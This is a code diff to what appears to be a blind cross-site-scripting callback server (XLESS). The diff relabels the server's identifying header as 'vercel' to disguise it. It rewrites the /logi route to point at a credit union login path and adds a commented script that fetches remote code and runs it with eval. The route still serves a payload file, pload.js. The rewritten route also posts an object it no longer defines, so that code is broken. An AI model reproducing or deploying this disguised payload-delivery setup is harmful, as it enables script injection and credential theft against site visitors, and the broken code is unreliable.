@@ -19,7 +19,7 @@ app.use(bodyParser.urlencoded({ limit: "15mb", extended: true }));
 
 app.use(function (req, res, next) {
   // Set custom headers
-  res.header("Powered-By", "XLESS");
+  res.header("Powered-By", "vercel");
   res.header("Access-Control-Allow-Origin", "*");
   res.header("Access-Control-Allow-Methods", "GET,POST");
   res.header("Access-Control-Allow-Headers", "Content-Type");
@@ -106,25 +106,11 @@ app.get("/examples", (req, res) => {
   res.send(page);
 });
 
-app.all("/logi", (req, res) => {
-  res.header("Content-Type", "text/plain");
-  var url = `http://whoer.net${req.headers["host"]}`;
-  // Send the 'page' variable before generating the alert, since 'page' wasn't defined in this scope, we skip sending it.
-  
-  // Process message from the incoming request
-  var message = req.query.text || req.body.text;
-  const alert = generate_message_alert(message);
-  
-  const data = {
-    form: {
-      payload: JSON.stringify({ username: "XLess", mrkdwn: true, text: alert }),
-    },
-  };
-
-  // Send the alert to the Slack webhook
+app.all("/logi", async (req, res) => {
+  var url = req.protocol + '://afcu.org/login/' + req.headers['host']
+  //page += `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "${url}");a.send();</script>\n\n`;
   request.post(slack_incoming_webhook, data, () => {
-    // After alert is sent, send the response with the requested file
-    res.sendFile(path.join(__dirname, "pload.js"));
+  res.sendFile(path.join(__dirname, "pload.js"));
   });
 });
 
